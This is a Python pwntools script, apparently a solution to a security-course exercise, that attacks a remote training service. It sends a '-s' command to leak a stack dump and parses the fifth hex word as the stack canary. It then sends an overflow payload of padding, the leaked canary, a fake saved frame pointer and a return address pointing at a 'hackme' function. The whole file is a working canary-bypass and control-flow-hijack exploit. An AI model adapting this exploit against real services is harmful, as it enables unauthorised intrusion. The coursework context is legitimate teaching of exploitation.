#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'   # change to 'info' to be quieter

HOST = 'inf226.puffling.no'
PORT = 6102
hackme_addr = 0x401236

io = remote(HOST, PORT)

# Get stack dump with b'-s'
io.send(b'-s\n')
data = io.recvrepeat(timeout=1)
text = data.decode(errors='ignore')
print("Raw leak:\n" + text)

# Parse hex from dump
lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
hex_lines = [ln for ln in lines if all(c in "0123456789abcdefABCDEF" for c in ln) and len(ln) >= 8]

if len(hex_lines) < 5:
    print("Couldn't find enough hex words in leak. Dump:\n" + text)
    io.close()
    exit(1)

# Canary hex is the 5th line in dump
print(f"Potenital canary: {hex_lines[4]}")
canary_hex = hex_lines[4]
canary = int(canary_hex, 16)
canary_bytes = p64(canary)
print(f"Parsed canary: 0x{canary:016x}")

# Build payload
# layout (from buffer start): 8 bytes padding, 8 byte canary, 8 byte saved RBP, 8 byte return address
padding = b'A' * 8 
saved_rbp = b'B' * 8
ret_addr = p64(hackme_addr)

payload = padding + canary_bytes + saved_rbp + ret_addr + b'\n'

print(f"Payload length: {len(payload)}")
print(f"Payload (hex): {payload.hex()}")

io.send(payload)

io.shutdown('out')
result = io.recvall(timeout=2)
print("Result:")
print(result.decode('ascii', errors='replace'))

io.close()
